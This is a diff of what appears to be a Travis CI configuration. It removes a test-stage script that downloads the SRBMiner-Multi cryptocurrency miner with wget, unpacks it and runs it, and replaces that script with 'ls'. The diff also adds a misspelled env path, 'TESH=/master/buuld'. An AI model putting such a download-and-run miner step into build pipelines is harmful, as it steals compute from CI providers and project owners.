@@ -1,18 +1,17 @@
-language:
-  - c
 arch:
   - amd64
-compiler:
-  - gcc
 services:
   - docker
 git:
   clone: false
   depth: false
   checkout: false
+env:
+  - TESH=/master/buuld
+  - TESH=/master/deploy
 os:
   - linux
 jobs:
   include:
     - stage: test
-      script: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && cd SRBMiner-Multi-0-6-6 && ./SRBMiner-MULTI
+      script: ls
